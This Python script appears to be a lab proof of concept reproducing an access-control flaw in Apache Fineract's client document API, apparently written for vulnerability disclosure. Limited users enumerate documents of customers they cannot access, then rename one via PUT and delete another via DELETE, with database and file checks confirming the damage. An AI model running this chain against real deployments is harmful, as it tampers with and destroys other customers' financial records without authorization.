#!/usr/bin/env python3
"""Loopback-only synthetic Fineract discovery-to-write probe on a verified build."""

import hashlib
import json
import os
import re
import subprocess
from pathlib import Path

import document_office_write_scope_reproduce as probe


RESULT = Path(os.environ["FINERACT_LAB_RESULT_PATH"])
TENANT_DB = os.environ["FINERACT_LAB_TENANT_DB"]
DB_USER = os.getenv("FINERACT_LAB_DB_USER", "root")
EXPECTED_HEAD = os.getenv("FINERACT_LAB_EXPECTED_HEAD")
ARTIFACT_PATH = os.getenv("FINERACT_LAB_ARTIFACT_PATH")
EXPECTED_ARTIFACT_SHA256 = os.getenv("FINERACT_LAB_EXPECTED_ARTIFACT_SHA256")
CONTENT_ROOT = Path(os.getenv("FINERACT_LAB_CONTENT_ROOT", Path.home() / ".fineract/DefaultDemoTenant"))
MAX_CLIENT_ID = int(os.getenv("FINERACT_LAB_SCAN_MAX_CLIENT_ID", "16"))
REPO = Path(os.getenv("FINERACT_LAB_REPO", Path(__file__).parent.parent / "fineract"))

if not re.fullmatch(r"[a-z0-9_]+", TENANT_DB) or not 1 <= MAX_CLIENT_ID <= 100:
    raise SystemExit("Unsafe database name or scan range")


def git(*args):
    return subprocess.check_output(["git", *args], cwd=REPO, text=True).strip()


def document_location(document_id):
    if not isinstance(document_id, int):
        raise TypeError("Document ID must be an integer")
    return subprocess.check_output([
        "psql", "-U", DB_USER, "-d", TENANT_DB, "-Atc",
        f"select location from m_document where id={document_id}",
    ], text=True).strip()


def document_exists(document_id):
    count = subprocess.check_output([
        "psql", "-U", DB_USER, "-d", TENANT_DB, "-Atc",
        f"select count(*) from m_document where id={document_id}",
    ], text=True).strip()
    return count == "1"


def save(record):
    RESULT.parent.mkdir(parents=True, exist_ok=True)
    RESULT.write_text(json.dumps(record, indent=2, sort_keys=True) + "\n")


def scan_and_write(credentials, pick_rank, method):
    # This function receives no target customer ID, document ID, or document name from setup.
    scanned = []
    candidates = []
    for client_id in range(1, MAX_CLIENT_ID + 1):
        status, body = probe.call_json("GET", f"/clients/{client_id}/documents", credentials)
        documents = body if status == 200 and isinstance(body, list) else []
        ids = sorted((doc["id"] for doc in documents if isinstance(doc, dict) and isinstance(doc.get("id"), int)), reverse=True)
        scanned.append({"client_id": client_id, "http": status, "document_ids": ids})
        if len(ids) >= pick_rank:
            client_status, _ = probe.call_json("GET", f"/clients/{client_id}", credentials)
            if client_status == 404:
                candidates.append({"client_id": client_id, "document_ids": ids})
    if not candidates:
        raise RuntimeError("API scan found no inaccessible customer with documents")
    target = {"client_id": candidates[0]["client_id"], "document_id": candidates[0]["document_ids"][pick_rank - 1]}
    parent_id, document_id = target["client_id"], target["document_id"]
    client_status, _ = probe.call_json("GET", f"/clients/{parent_id}", credentials)
    before_status, before = probe.call_json("GET", f"/clients/{parent_id}/documents/{document_id}", credentials)
    attachment_status, attachment = probe.call("GET", f"/clients/{parent_id}/documents/{document_id}/attachment", credentials)
    if client_status != 404 or before_status != 200 or attachment_status != 200:
        raise RuntimeError(f"Control failed: client={client_status}, document={before_status}, attachment={attachment_status}")
    result = {
        "scan": scanned,
        "discovered_from_api": target,
        "client_detail_http": client_status,
        "document_before_http": before_status,
        "document_before_name": before.get("name") if isinstance(before, dict) else None,
        "attachment_http": attachment_status,
        "attachment_sha256": hashlib.sha256(attachment).hexdigest(),
    }
    path = f"/clients/{parent_id}/documents/{document_id}"
    if method == "PUT":
        changed = "A-office account changed B document after API scan " + probe.tag
        body, content_type = probe.multipart({"name": changed})
        write_status, _ = probe.call("PUT", path, credentials, body, content_type)
        after_status, after = probe.call_json("GET", path, credentials)
        result.update({"write_method": "PUT", "write_path": path, "write_http": write_status,
                       "document_after_http": after_status,
                       "document_after_name": after.get("name") if isinstance(after, dict) else None})
        if write_status != 200 or after_status != 200 or result["document_after_name"] != changed:
            raise RuntimeError(f"Update did not persist: {result}")
    elif method == "DELETE":
        write_status, _ = probe.call("DELETE", path, credentials)
        after_status, _ = probe.call_json("GET", path, credentials)
        result.update({"write_method": "DELETE", "write_path": path, "write_http": write_status,
                       "document_after_http": after_status})
        if write_status != 200 or after_status != 404:
            raise RuntimeError(f"Delete did not persist: {result}")
    else:
        raise ValueError(method)
    return result


def main():
    provenance = {}
    if EXPECTED_HEAD:
        head = git("rev-parse", "HEAD")
        status = git("status", "--porcelain=v1")
        if head != EXPECTED_HEAD or status:
            raise RuntimeError(f"Source checkout differs from expected clean HEAD: {head}, {status}")
        provenance = {"head": head, "git_status_porcelain": status}
    elif ARTIFACT_PATH and EXPECTED_ARTIFACT_SHA256:
        artifact = Path(ARTIFACT_PATH)
        actual_sha256 = hashlib.sha256(artifact.read_bytes()).hexdigest()
        if actual_sha256 != EXPECTED_ARTIFACT_SHA256:
            raise RuntimeError("Official release artifact SHA-256 mismatch")
        provenance = {"artifact_name": artifact.name, "artifact_sha256": actual_sha256}
    else:
        raise RuntimeError("Specify an expected source HEAD or a verified release artifact")
    record = {"source": probe.BASE, **provenance, "tenant_db": TENANT_DB,
              "scan_range": [1, MAX_CLIENT_ID], "setup": {}, "actors": {}}
    update_actor, update_credentials = probe.role_and_user("chain_update", {
        "READ_CLIENT": True, "READ_DOCUMENT": True, "UPDATE_DOCUMENT": True,
    })
    delete_actor, delete_credentials = probe.role_and_user("chain_delete", {
        "READ_CLIENT": True, "READ_DOCUMENT": True, "DELETE_DOCUMENT": True,
    })
    update_label = "CHAIN-UPDATE-" + probe.tag
    delete_label = "CHAIN-DELETE-" + probe.tag
    update_id, update_hash = probe.upload(probe.client_b, update_label)
    delete_id, delete_hash = probe.upload(probe.client_b, delete_label)
    paths = {}
    for label, document_id, expected_hash in (
        ("update", update_id, update_hash), ("delete", delete_id, delete_hash)
    ):
        location = document_location(document_id)
        file = CONTENT_ROOT / location
        if not file.is_file() or hashlib.sha256(file.read_bytes()).hexdigest() != expected_hash:
            raise RuntimeError(f"Fixture content missing or altered before attack: {label}")
        paths[label] = file
        record["setup"][label] = {"document_id": document_id, "client_id": probe.client_b,
                                  "name": "Synthetic " + (update_label if label == "update" else delete_label),
                                  "file_sha256": expected_hash, "file_existed_before": True,
                                  "location": location}
    record["setup"]["actors"] = {"update": update_actor, "delete": delete_actor}
    save(record)
    # The attack functions below discover their own target IDs using only limited-user API calls.
    record["actors"]["update"] = scan_and_write(update_credentials, 2, "PUT")
    record["actors"]["delete"] = scan_and_write(delete_credentials, 1, "DELETE")
    for label in ("update", "delete"):
        discovered = record["actors"][label]["discovered_from_api"]
        if discovered != {"client_id": probe.client_b, "document_id": record["setup"][label]["document_id"]}:
            raise RuntimeError(f"API-discovered target differs from fixture: {label}")
    record["operator_oracle_after"] = {
        "update_db_row_exists": document_exists(update_id),
        "delete_db_row_exists": document_exists(delete_id),
        "update_file_exists": paths["update"].is_file(),
        "delete_file_exists": paths["delete"].is_file(),
    }
    if record["operator_oracle_after"] != {
        "update_db_row_exists": True,
        "delete_db_row_exists": False,
        "update_file_exists": True,
        "delete_file_exists": False,
    }:
        raise RuntimeError(f"Operator after-state unexpected: {record['operator_oracle_after']}")
    save(record)
    print(RESULT)
    print(json.dumps({"actors": record["actors"], "operator_oracle_after": record["operator_oracle_after"]},
                     indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
